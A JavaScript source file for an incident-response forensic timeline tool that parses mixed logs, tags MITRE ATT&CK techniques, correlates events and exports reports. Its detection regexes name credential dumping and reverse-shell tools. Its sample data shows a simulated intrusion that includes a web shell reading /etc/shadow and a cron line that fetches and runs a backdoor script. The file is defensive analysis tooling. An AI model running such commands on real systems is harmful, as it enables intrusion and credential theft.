// Forensic Timeline Builder — reconstruct incident timelines from evidence
// Copyright (c) 2026 Darknode-Official. All rights reserved.

const esc = (s) => String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));

// ============================================================================
// LOG PARSERS — detect and extract timestamped events
// ============================================================================
const PARSERS = [
  {
    name: 'Windows Event Log',
    detect: function(line) { return /EventID|Event ID|<EventID>/i.test(line); },
    parse: function(line) {
      var ts = null, eventId = '', source = '', msg = '';
      var tsMatch = line.match(/(\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2})/);
      if (tsMatch) ts = new Date(tsMatch[1]);
      var idMatch = line.match(/(?:EventID|Event ID)[:\s=]*(\d+)/i);
      if (idMatch) eventId = idMatch[1];
      var srcMatch = line.match(/(?:Source|Provider)[:\s=]*["']?([^"'\s,]+)/i);
      if (srcMatch) source = srcMatch[1];
      msg = line.replace(tsMatch ? tsMatch[0] : '', '').trim();
      if (!ts) return null;
      return { timestamp: ts, source: 'WinEvent', detail: 'Event ID ' + eventId + (source ? ' (' + source + ')' : ''), raw: line, category: 'endpoint' };
    }
  },
  {
    name: 'Syslog',
    detect: function(line) { return /^[A-Z][a-z]{2}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2}/.test(line); },
    parse: function(line) {
      var m = line.match(/^([A-Z][a-z]{2}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2})\s+(\S+)\s+(\S+?)(?:\[\d+\])?:\s*(.*)/);
      if (!m) return null;
      var ts = new Date(m[1] + ' ' + new Date().getFullYear());
      return { timestamp: ts, source: 'Syslog', detail: m[3] + ': ' + m[4], host: m[2], raw: line, category: 'system' };
    }
  },
  {
    name: 'Apache/Nginx Access Log',
    detect: function(line) { return /^\d+\.\d+\.\d+\.\d+\s.*\[.*\]\s"(GET|POST|PUT|DELETE|HEAD|OPTIONS)/.test(line); },
    parse: function(line) {
      var m = line.match(/^(\S+)\s+\S+\s+(\S+)\s+\[([^\]]+)\]\s+"(\S+)\s+(\S+)\s+\S+"\s+(\d+)\s+(\d+)/);
      if (!m) return null;
      var ts = new Date(m[3].replace(/\//g, '-').replace(/:/, ' '));
      return { timestamp: ts, source: 'WebAccess', detail: m[4] + ' ' + m[5] + ' -> ' + m[6] + ' (' + m[7] + 'B)', ip: m[1], user: m[2], raw: line, category: 'web' };
    }
  },
  {
    name: 'Firewall Log',
    detect: function(line) { return /(?:ACCEPT|DROP|DENY|REJECT|ALLOW|BLOCK)\s/i.test(line) && /\d+\.\d+\.\d+\.\d+/.test(line); },
    parse: function(line) {
      var tsMatch = line.match(/(\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}|\d{2}:\d{2}:\d{2})/);
      var ts = tsMatch ? new Date(tsMatch[1].length < 12 ? new Date().toISOString().split('T')[0] + 'T' + tsMatch[1] : tsMatch[1]) : new Date();
      var actionMatch = line.match(/(ACCEPT|DROP|DENY|REJECT|ALLOW|BLOCK)/i);
      var ipMatch = line.match(/(?:SRC|src|from)[=:\s]*(\d+\.\d+\.\d+\.\d+)/i);
      var dstMatch = line.match(/(?:DST|dst|to)[=:\s]*(\d+\.\d+\.\d+\.\d+)/i);
      var portMatch = line.match(/(?:DPT|dport|port)[=:\s]*(\d+)/i);
      return { timestamp: ts, source: 'Firewall', detail: (actionMatch ? actionMatch[1] : '?') + ' ' + (ipMatch ? ipMatch[1] : '?') + ' -> ' + (dstMatch ? dstMatch[1] : '?') + ':' + (portMatch ? portMatch[1] : '?'), raw: line, category: 'network' };
    }
  },
  {
    name: 'Auth Log',
    detect: function(line) { return /sshd|sudo|su:|pam_|login|authentication|Failed password|Accepted/i.test(line); },
    parse: function(line) {
      var m = line.match(/^([A-Z][a-z]{2}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2})\s+(\S+)\s+(.*)/);
      if (!m) {
        var tsMatch = line.match(/(\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2})/);
        if (!tsMatch) return null;
        return { timestamp: new Date(tsMatch[1]), source: 'Auth', detail: line.replace(tsMatch[0], '').trim(), raw: line, category: 'auth' };
      }
      return { timestamp: new Date(m[1] + ' ' + new Date().getFullYear()), source: 'Auth', detail: m[3], host: m[2], raw: line, category: 'auth' };
    }
  },
  {
    name: 'Generic Timestamp',
    detect: function(line) { return /\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}/.test(line); },
    parse: function(line) {
      var m = line.match(/(\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}(?:\.\d+)?(?:Z|[+-]\d{2}:?\d{2})?)/);
      if (!m) return null;
      return { timestamp: new Date(m[1]), source: 'Generic', detail: line.replace(m[0], '').trim(), raw: line, category: 'other' };
    }
  }
];

// ============================================================================
// MITRE AUTO-TAGGER
// ============================================================================
const MITRE_PATTERNS = [
  { pattern: /mimikatz|sekurlsa|lsadump|hashdump/i, technique: 'T1003', name: 'OS Credential Dumping' },
  { pattern: /pass.the.hash|pth|psexec.*hash/i, technique: 'T1550.002', name: 'Pass the Hash' },
  { pattern: /kerberoast|GetUserSPNs|TGS.*RC4/i, technique: 'T1558.003', name: 'Kerberoasting' },
  { pattern: /powershell.*enc|EncodedCommand|IEX|Invoke-Expression/i, technique: 'T1059.001', name: 'PowerShell' },
  { pattern: /schtasks.*create|at \d+:\d+/i, technique: 'T1053.005', name: 'Scheduled Task' },
  { pattern: /reg.*add.*Run|CurrentVersion\\Run/i, technique: 'T1547.001', name: 'Registry Run Key' },
  { pattern: /sc.*create|New-Service/i, technique: 'T1543.003', name: 'Windows Service' },
  { pattern: /Failed password|invalid user|authentication failure/i, technique: 'T1110', name: 'Brute Force' },
  { pattern: /Accepted.*password|session opened|successful login/i, technique: 'T1078', name: 'Valid Accounts' },
  { pattern: /sudo|su\s|privilege.*escalat/i, technique: 'T1548', name: 'Abuse Elevation Control' },
  { pattern: /wget.*http|curl.*http|certutil.*urlcache/i, technique: 'T1105', name: 'Ingress Tool Transfer' },
  { pattern: /nc\s+-.*listen|ncat|reverse.*shell|bind.*shell/i, technique: 'T1059', name: 'Command Interpreter' },
  { pattern: /whoami|net\s+user|id\s*$/im, technique: 'T1033', name: 'System Owner Discovery' },
  { pattern: /net\s+share|smbclient|mount.*cifs/i, technique: 'T1021.002', name: 'SMB/Windows Admin Shares' },
  { pattern: /base64.*decode|certutil.*decode/i, technique: 'T1140', name: 'Deobfuscate/Decode' },
  { pattern: /event.*log.*clear|wevtutil.*cl|Clear-EventLog/i, technique: 'T1070.001', name: 'Clear Windows Event Logs' },
  { pattern: /crontab|\/etc\/cron/i, technique: 'T1053.003', name: 'Cron' },
  { pattern: /\.ssh\/authorized|ssh-keygen/i, technique: 'T1098.004', name: 'SSH Authorized Keys' },
  { pattern: /rdp|Remote Desktop|mstsc/i, technique: 'T1021.001', name: 'Remote Desktop Protocol' },
  { pattern: /nmap|masscan|port.*scan/i, technique: 'T1046', name: 'Network Service Discovery' },
];

function autoTag(text) {
  var tags = [];
  MITRE_PATTERNS.forEach(function(p) {
    if (p.pattern.test(text)) tags.push({ technique: p.technique, name: p.name });
  });
  return tags;
}

// ============================================================================
// CATEGORY COLORS
// ============================================================================
var CAT_COLORS = {
  endpoint: '#00e5ff',
  system: '#00e676',
  web: '#ff9100',
  network: '#ffd600',
  auth: '#ff1744',
  email: '#d500f9',
  filesystem: '#7c5cff',
  other: '#888'
};

// ============================================================================
// RENDER
// ============================================================================
export function renderForensicTimeline(main) {
  var events = [];
  var activeTab = 'input';
  var filterCategory = 'all';
  var filterKeyword = '';
  var tzOffset = 0;

  function render() {
    main.innerHTML =
      '<h1 class="pg-h1">Forensic Timeline Builder</h1>' +
      '<p class="muted pg-sub">Reconstruct incident timelines from multiple evidence sources. Paste logs, the parser auto-detects the format.</p>' +
      '<div class="tab-bar" style="overflow-x:auto;flex-wrap:nowrap">' +
        '<button class="tab' + (activeTab === 'input' ? ' active' : '') + '" data-tab="input">Evidence Input</button>' +
        '<button class="tab' + (activeTab === 'timeline' ? ' active' : '') + '" data-tab="timeline">Timeline (' + events.length + ')</button>' +
        '<button class="tab' + (activeTab === 'correlate' ? ' active' : '') + '" data-tab="correlate">Correlation</button>' +
        '<button class="tab' + (activeTab === 'gaps' ? ' active' : '') + '" data-tab="gaps">Gap Detection</button>' +
        '<button class="tab' + (activeTab === 'mitre' ? ' active' : '') + '" data-tab="mitre">MITRE Tags</button>' +
        '<button class="tab' + (activeTab === 'export' ? ' active' : '') + '" data-tab="export">Export</button>' +
      '</div>' +
      '<div id="ft-content" style="margin-top:12px"></div>';

    main.querySelector('.tab-bar').onclick = function(e) {
      var b = e.target.closest('.tab');
      if (!b) return;
      activeTab = b.dataset.tab;
      render();
    };

    var content = main.querySelector('#ft-content');
    if (activeTab === 'input') renderInputTab(content);
    else if (activeTab === 'timeline') renderTimelineTab(content);
    else if (activeTab === 'correlate') renderCorrelateTab(content);
    else if (activeTab === 'gaps') renderGapsTab(content);
    else if (activeTab === 'mitre') renderMitreTab(content);
    else if (activeTab === 'export') renderExportTab(content);
  }

  function parseAllLines(text) {
    var lines = text.split('\n').filter(function(l) { return l.trim(); });
    var parsed = [];
    lines.forEach(function(line) {
      for (var i = 0; i < PARSERS.length; i++) {
        if (PARSERS[i].detect(line)) {
          var ev = PARSERS[i].parse(line);
          if (ev && ev.timestamp && !isNaN(ev.timestamp.getTime())) {
            if (tzOffset !== 0) ev.timestamp = new Date(ev.timestamp.getTime() + tzOffset * 3600000);
            ev.tags = autoTag(ev.raw || ev.detail || '');
            ev.suspicious = false;
            parsed.push(ev);
            break;
          }
        }
      }
    });
    parsed.sort(function(a, b) { return a.timestamp - b.timestamp; });
    return parsed;
  }

  function renderInputTab(container) {
    container.innerHTML =
      '<div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:8px">' +
        '<label style="font-size:.78rem;color:var(--mut)">Timezone offset (hours):</label>' +
        '<input type="number" class="tk-f" id="ft-tz" value="0" min="-12" max="14" style="max-width:80px">' +
        '<span style="flex:1"></span>' +
        '<span style="font-size:.75rem;color:var(--mut)">Events loaded: ' + events.length + '</span>' +
      '</div>' +
      '<textarea class="tk-in" id="ft-input" rows="12" placeholder="Paste log entries here. Supported formats:\n- Windows Event Logs\n- Syslog\n- Apache/Nginx access logs\n- Firewall logs (iptables, pf)\n- Auth logs (sshd, sudo)\n- Any line with an ISO timestamp\n\nMultiple formats can be mixed — the parser auto-detects each line."></textarea>' +
      '<div class="tk-btns">' +
        '<button class="btn sm" id="ft-parse">Parse and Add to Timeline</button>' +
        '<button class="btn sm ghost" id="ft-clear">Clear Timeline</button>' +
        '<button class="btn sm ghost" id="ft-sample">Load Sample Data</button>' +
      '</div>' +
      '<pre class="tk-out" id="ft-parse-result" style="margin-top:8px"></pre>';

    container.querySelector('#ft-tz').onchange = function() { tzOffset = parseInt(this.value) || 0; };

    container.querySelector('#ft-parse').onclick = function() {
      var text = container.querySelector('#ft-input').value;
      var parsed = parseAllLines(text);
      events = events.concat(parsed);
      events.sort(function(a, b) { return a.timestamp - b.timestamp; });
      container.querySelector('#ft-parse-result').textContent = 'Parsed ' + parsed.length + ' events. Total timeline: ' + events.length + ' events.';
    };

    container.querySelector('#ft-clear').onclick = function() { events = []; render(); };

    container.querySelector('#ft-sample').onclick = function() {
      container.querySelector('#ft-input').value =
        'Sep 12 03:14:22 webserver sshd[2847]: Failed password for root from 203.0.113.50 port 45122 ssh2\n' +
        'Sep 12 03:14:23 webserver sshd[2847]: Failed password for root from 203.0.113.50 port 45122 ssh2\n' +
        'Sep 12 03:14:25 webserver sshd[2847]: Failed password for root from 203.0.113.50 port 45122 ssh2\n' +
        'Sep 12 03:14:27 webserver sshd[2847]: Accepted password for admin from 203.0.113.50 port 45130 ssh2\n' +
        'Sep 12 03:15:01 webserver sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash\n' +
        'Sep 12 03:15:45 webserver sshd[2890]: Accepted publickey for root from 10.0.0.5 port 22 ssh2\n' +
        'Sep 12 03:16:02 webserver kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.50 DST=10.0.0.20 PROTO=TCP DPT=3306\n' +
        '10.0.0.20 - admin [12/Sep/2026:03:17:33 -0700] "GET /admin/config.php HTTP/1.1" 200 4521 "-" "Mozilla/5.0"\n' +
        '10.0.0.20 - admin [12/Sep/2026:03:17:45 -0700] "POST /admin/upload.php HTTP/1.1" 200 89 "-" "curl/7.68.0"\n' +
        '10.0.0.20 - - [12/Sep/2026:03:18:01 -0700] "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 31 "-" "curl/7.68.0"\n' +
        '10.0.0.20 - - [12/Sep/2026:03:18:15 -0700] "GET /uploads/shell.php?cmd=cat+/etc/shadow HTTP/1.1" 200 1245 "-" "curl/7.68.0"\n' +
        'Sep 12 03:19:00 webserver CRON[3012]: (root) CMD (wget -q http://203.0.113.50/backdoor.sh -O /tmp/.bd.sh && bash /tmp/.bd.sh)\n' +
        '2026-09-12T03:19:30 EventID=4688 Source=Security NewProcessName=C:\\Windows\\System32\\cmd.exe ProcessCommandLine="cmd /c whoami"\n' +
        '2026-09-12T03:20:00 EventID=4624 Source=Security LogonType=10 TargetUserName=administrator SourceNetworkAddress=10.0.0.20';
    };
  }

  function renderTimelineTab(container) {
    if (events.length === 0) {
      container.innerHTML = '<p class="muted" style="padding:40px;text-align:center">No events loaded. Paste logs in the Evidence Input tab.</p>';
      return;
    }
    var cats = ['all'];
    events.forEach(function(e) { if (cats.indexOf(e.category) === -1) cats.push(e.category); });

    container.innerHTML =
      '<div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:12px">' +
        '<label style="font-size:.78rem;color:var(--mut)">Filter:</label>' +
        '<select class="tk-f" id="ft-filter-cat" style="max-width:150px">' + cats.map(function(c) { return '<option value="' + c + '"' + (c === filterCategory ? ' selected' : '') + '>' + c + '</option>'; }).join('') + '</select>' +
        '<input type="text" class="tk-f" id="ft-filter-kw" placeholder="Keyword search..." value="' + esc(filterKeyword) + '" style="max-width:200px">' +
        '<button class="btn sm ghost" id="ft-filter-go">Filter</button>' +
        '<span style="flex:1"></span>' +
        '<span style="font-size:.75rem;color:var(--mut)">' + events.length + ' total events</span>' +
      '</div>' +
      '<div id="ft-event-list" style="max-height:500px;overflow-y:auto"></div>';

    function renderEvents() {
      var filtered = events.filter(function(e) {
        if (filterCategory !== 'all' && e.category !== filterCategory) return false;
        if (filterKeyword && !(e.detail || '').toLowerCase().includes(filterKeyword.toLowerCase()) && !(e.raw || '').toLowerCase().includes(filterKeyword.toLowerCase())) return false;
        return true;
      });

      var list = container.querySelector('#ft-event-list');
      list.innerHTML = filtered.map(function(e, i) {
        var color = CAT_COLORS[e.category] || '#888';
        var tagHtml = (e.tags || []).map(function(t) { return '<span style="font-size:.6rem;color:var(--acc);border:1px solid var(--acc);padding:0 4px;border-radius:2px;margin-left:4px">' + esc(t.technique) + '</span>'; }).join('');
        return '<div style="display:flex;gap:8px;padding:6px 0;border-bottom:1px solid var(--line);font-size:.78rem;cursor:pointer' + (e.suspicious ? ';background:rgba(255,23,68,0.08)' : '') + '" data-idx="' + i + '">' +
          '<span style="color:var(--mut);white-space:nowrap;min-width:140px">' + e.timestamp.toISOString().replace('T', ' ').split('.')[0] + '</span>' +
          '<span style="color:' + color + ';font-weight:600;min-width:80px">' + esc(e.source) + '</span>' +
          '<span style="flex:1;word-break:break-word">' + esc(e.detail) + tagHtml + '</span>' +
          '<button class="btn sm ghost" style="padding:2px 6px;font-size:.65rem" data-mark="' + i + '">' + (e.suspicious ? 'MARKED' : 'Mark') + '</button>' +
        '</div>';
      }).join('');

      list.onclick = function(ev) {
        var markBtn = ev.target.closest('[data-mark]');
        if (markBtn) {
          var idx = parseInt(markBtn.dataset.mark);
          var filtered2 = events.filter(function(e2) {
            if (filterCategory !== 'all' && e2.category !== filterCategory) return false;
            if (filterKeyword && !(e2.detail || '').toLowerCase().includes(filterKeyword.toLowerCase()) && !(e2.raw || '').toLowerCase().includes(filterKeyword.toLowerCase())) return false;
            return true;
          });
          if (filtered2[idx]) { filtered2[idx].suspicious = !filtered2[idx].suspicious; renderEvents(); }
        }
      };
    }

    container.querySelector('#ft-filter-go').onclick = function() {
      filterCategory = container.querySelector('#ft-filter-cat').value;
      filterKeyword = container.querySelector('#ft-filter-kw').value;
      renderEvents();
    };
    renderEvents();
  }

  function renderCorrelateTab(container) {
    if (events.length < 2) {
      container.innerHTML = '<p class="muted" style="padding:40px;text-align:center">Need at least 2 events to correlate. Load more evidence.</p>';
      return;
    }
    container.innerHTML =
      '<h2 class="pg-h2">Event Correlation</h2>' +
      '<p class="muted" style="margin-bottom:12px">Find events from different sources that occurred within a time window.</p>' +
      '<div style="display:flex;gap:8px;align-items:center;margin-bottom:12px">' +
        '<label style="font-size:.78rem;color:var(--mut)">Window (seconds):</label>' +
        '<input type="number" class="tk-f" id="ft-corr-window" value="30" min="1" max="3600" style="max-width:100px">' +
        '<button class="btn sm" id="ft-corr-run">Find Correlations</button>' +
      '</div>' +
      '<div id="ft-corr-results"></div>';

    container.querySelector('#ft-corr-run').onclick = function() {
      var window = parseInt(container.querySelector('#ft-corr-window').value) * 1000;
      var groups = [];
      for (var i = 0; i < events.length; i++) {
        var group = [events[i]];
        for (var j = i + 1; j < events.length; j++) {
          if (Math.abs(events[j].timestamp - events[i].timestamp) <= window && events[j].source !== events[i].source) {
            group.push(events[j]);
          }
          if (events[j].timestamp - events[i].timestamp > window) break;
        }
        if (group.length > 1) groups.push(group);
      }
      // Deduplicate overlapping groups
      var unique = [];
      var seen = new Set();
      groups.forEach(function(g) {
        var key = g.map(function(e) { return e.timestamp.getTime() + e.source; }).join('|');
        if (!seen.has(key)) { seen.add(key); unique.push(g); }
      });

      if (unique.length === 0) {
        container.querySelector('#ft-corr-results').innerHTML = '<p class="muted">No cross-source correlations found within ' + (window / 1000) + 's window.</p>';
        return;
      }

      container.querySelector('#ft-corr-results').innerHTML =
        '<p style="font-size:.8rem;margin-bottom:8px">' + unique.length + ' correlation groups found:</p>' +
        unique.slice(0, 20).map(function(g, gi) {
          return '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:10px;margin-bottom:8px">' +
            '<div style="font-size:.75rem;font-weight:600;color:var(--acc);margin-bottom:4px">Group ' + (gi + 1) + ' (' + g.length + ' events within ' + (window / 1000) + 's)</div>' +
            g.map(function(e) {
              var color = CAT_COLORS[e.category] || '#888';
              return '<div style="font-size:.75rem;border-left:2px solid ' + color + ';padding-left:8px;margin:2px 0">' +
                '<span style="color:var(--mut)">' + e.timestamp.toISOString().replace('T', ' ').split('.')[0] + '</span> ' +
                '<span style="color:' + color + ';font-weight:600">[' + esc(e.source) + ']</span> ' +
                esc(e.detail) + '</div>';
            }).join('') +
          '</div>';
        }).join('');
    };
  }

  function renderGapsTab(container) {
    if (events.length < 2) {
      container.innerHTML = '<p class="muted" style="padding:40px;text-align:center">Need events to detect gaps.</p>';
      return;
    }
    container.innerHTML =
      '<h2 class="pg-h2">Activity Gap Detection</h2>' +
      '<p class="muted" style="margin-bottom:12px">Time periods with no logged activity may indicate log tampering, system outage, or attacker covering tracks.</p>' +
      '<div style="display:flex;gap:8px;align-items:center;margin-bottom:12px">' +
        '<label style="font-size:.78rem;color:var(--mut)">Minimum gap (minutes):</label>' +
        '<input type="number" class="tk-f" id="ft-gap-min" value="5" min="1" max="1440" style="max-width:100px">' +
        '<button class="btn sm" id="ft-gap-find">Find Gaps</button>' +
      '</div>' +
      '<div id="ft-gap-results"></div>';

    container.querySelector('#ft-gap-find').onclick = function() {
      var minGap = parseInt(container.querySelector('#ft-gap-min').value) * 60000;
      var gaps = [];
      for (var i = 1; i < events.length; i++) {
        var diff = events[i].timestamp - events[i - 1].timestamp;
        if (diff >= minGap) {
          gaps.push({ start: events[i - 1].timestamp, end: events[i].timestamp, duration: diff, beforeEvent: events[i - 1], afterEvent: events[i] });
        }
      }
      if (gaps.length === 0) {
        container.querySelector('#ft-gap-results').innerHTML = '<p style="color:#00e676;font-size:.82rem">No significant gaps found. Logging appears continuous.</p>';
        return;
      }
      container.querySelector('#ft-gap-results').innerHTML =
        '<p style="font-size:.8rem;margin-bottom:8px;color:#ff9100">' + gaps.length + ' gap(s) detected:</p>' +
        gaps.map(function(g) {
          var mins = Math.round(g.duration / 60000);
          var suspicious = mins > 30;
          return '<div style="background:var(--card);border:1px solid ' + (suspicious ? '#ff1744' : 'var(--line)') + ';border-radius:6px;padding:10px;margin-bottom:6px">' +
            '<div style="font-size:.82rem;font-weight:600;color:' + (suspicious ? '#ff1744' : '#ff9100') + '">' + mins + ' minute gap' + (suspicious ? ' [SUSPICIOUS]' : '') + '</div>' +
            '<div style="font-size:.75rem;color:var(--mut);margin:4px 0">From: ' + g.start.toISOString().replace('T', ' ').split('.')[0] + '</div>' +
            '<div style="font-size:.75rem;color:var(--mut)">To: ' + g.end.toISOString().replace('T', ' ').split('.')[0] + '</div>' +
            (suspicious ? '<div style="font-size:.75rem;color:#ff1744;margin-top:4px">Possible log tampering or system outage. Investigate: were logs cleared? Did the system reboot? Check for Event ID 1102 (audit log cleared) or 104 (system log cleared).</div>' : '') +
          '</div>';
        }).join('');
    };
  }

  function renderMitreTab(container) {
    var allTags = {};
    events.forEach(function(e) {
      (e.tags || []).forEach(function(t) {
        if (!allTags[t.technique]) allTags[t.technique] = { technique: t.technique, name: t.name, count: 0, events: [] };
        allTags[t.technique].count++;
        if (allTags[t.technique].events.length < 5) allTags[t.technique].events.push(e);
      });
    });
    var tagList = Object.values(allTags).sort(function(a, b) { return b.count - a.count; });

    if (tagList.length === 0) {
      container.innerHTML = '<p class="muted" style="padding:40px;text-align:center">No MITRE ATT&CK techniques detected in loaded events. Load more evidence or evidence with attack indicators.</p>';
      return;
    }

    container.innerHTML =
      '<h2 class="pg-h2">MITRE ATT&CK Auto-Tags</h2>' +
      '<p class="muted" style="margin-bottom:12px">' + tagList.length + ' techniques detected across ' + events.length + ' events.</p>' +
      '<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:10px">' +
      tagList.map(function(t) {
        return '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:12px">' +
          '<div style="display:flex;align-items:center;gap:8px;margin-bottom:4px">' +
            '<span style="font-size:.8rem;font-weight:700;color:var(--acc)">' + esc(t.technique) + '</span>' +
            '<span style="font-size:.82rem;font-weight:600">' + esc(t.name) + '</span>' +
            '<span style="margin-left:auto;font-size:.8rem;font-weight:700;color:#ff1744">' + t.count + 'x</span>' +
          '</div>' +
          t.events.map(function(e) {
            return '<div style="font-size:.72rem;color:var(--mut);border-left:2px solid var(--acc);padding-left:6px;margin:3px 0;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">' +
              e.timestamp.toISOString().replace('T', ' ').split('.')[0] + ' — ' + esc((e.detail || '').substring(0, 80)) + '</div>';
          }).join('') +
        '</div>';
      }).join('') +
      '</div>';
  }

  function renderExportTab(container) {
    if (events.length === 0) {
      container.innerHTML = '<p class="muted" style="padding:40px;text-align:center">No events to export.</p>';
      return;
    }
    var suspicious = events.filter(function(e) { return e.suspicious; });
    container.innerHTML =
      '<h2 class="pg-h2">Export Timeline</h2>' +
      '<p class="muted" style="margin-bottom:12px">Export the full timeline or just marked suspicious events.</p>' +
      '<div class="tk-btns">' +
        '<button class="btn sm" id="ft-exp-all">Export All (' + events.length + ' events)</button>' +
        '<button class="btn sm ghost" id="ft-exp-sus">Export Suspicious (' + suspicious.length + ' marked)</button>' +
        '<button class="btn sm ghost" id="ft-exp-report">Generate IR Report</button>' +
      '</div>' +
      '<pre class="tk-out" id="ft-exp-out" style="margin-top:8px;max-height:400px;overflow-y:auto"></pre>';

    function exportEvents(evts) {
      return 'timestamp,source,category,detail,mitre,suspicious\n' +
        evts.map(function(e) {
          var tags = (e.tags || []).map(function(t) { return t.technique; }).join(';');
          return '"' + e.timestamp.toISOString() + '","' + e.source + '","' + e.category + '","' + (e.detail || '').replace(/"/g, '""') + '","' + tags + '",' + (e.suspicious ? 'YES' : '');
        }).join('\n');
    }

    container.querySelector('#ft-exp-all').onclick = function() {
      container.querySelector('#ft-exp-out').textContent = exportEvents(events);
    };
    container.querySelector('#ft-exp-sus').onclick = function() {
      container.querySelector('#ft-exp-out').textContent = exportEvents(suspicious);
    };
    container.querySelector('#ft-exp-report').onclick = function() {
      var allTags = {};
      events.forEach(function(e) { (e.tags || []).forEach(function(t) { allTags[t.technique] = t.name; }); });
      var report = '=== INCIDENT RESPONSE TIMELINE REPORT ===\n';
      report += 'Generated: ' + new Date().toISOString() + '\n';
      report += 'Total events: ' + events.length + '\n';
      report += 'Suspicious events: ' + suspicious.length + '\n';
      report += 'Time span: ' + events[0].timestamp.toISOString() + ' to ' + events[events.length - 1].timestamp.toISOString() + '\n';
      report += 'MITRE techniques detected: ' + Object.keys(allTags).join(', ') + '\n\n';
      report += '--- TIMELINE ---\n';
      events.forEach(function(e) {
        var prefix = e.suspicious ? '[!] ' : '    ';
        report += prefix + e.timestamp.toISOString().replace('T', ' ').split('.')[0] + ' [' + e.source + '] ' + (e.detail || '') + '\n';
      });
      if (suspicious.length > 0) {
        report += '\n--- SUSPICIOUS EVENTS ---\n';
        suspicious.forEach(function(e) {
          report += '[!] ' + e.timestamp.toISOString().replace('T', ' ').split('.')[0] + ' [' + e.source + '] ' + (e.detail || '') + '\n';
          if (e.tags && e.tags.length > 0) report += '    MITRE: ' + e.tags.map(function(t) { return t.technique + ' (' + t.name + ')'; }).join(', ') + '\n';
        });
      }
      container.querySelector('#ft-exp-out').textContent = report;
    };
  }

  render();
}
